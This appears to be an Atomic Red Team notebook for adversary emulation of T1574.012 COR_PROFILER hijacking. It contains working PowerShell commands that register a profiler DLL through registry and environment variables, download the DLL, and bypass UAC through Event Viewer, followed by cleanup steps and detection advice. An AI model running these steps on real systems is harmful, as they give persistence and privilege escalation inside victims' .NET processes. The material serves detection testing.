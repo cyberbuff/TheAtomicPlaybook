{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ec0df4a7",
   "metadata": {},
   "source": "# T1574.012 - COR_PROFILER\nAdversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)"
  },
  {
   "cell_type": "markdown",
   "id": "140c46d9",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "af48987f",
   "metadata": {},
   "source": "### Atomic Test #1 - User scope COR_PROFILER\nCreates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: \"#{file_name}\" must be present\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "363f9552",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "46fc1aab",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nWrite-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23615a0f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "3e0e42d0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d025e573",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e548e768",
   "metadata": {},
   "source": "### Atomic Test #2 - System Scope COR_PROFILER\nCreates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: \"#{file_name}\" must be present\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9ba75ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "de9d9225",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nWrite-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca0a35c9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "c774cb02",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95ce1470",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "21e43728",
   "metadata": {},
   "source": "### Atomic Test #3 - Registry-free process scope COR_PROFILER\nCreates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: \"#{file_name}\" must be present\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6e31d9fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "0d699812",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n$env:COR_PROFILER_PATH = '\"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\"'\nPOWERSHELL -c 'Start-Sleep 1'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "272d31db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "db137bf0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c45e4841",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.012 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "595c7472",
   "metadata": {},
   "source": "## Detection\nFor detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}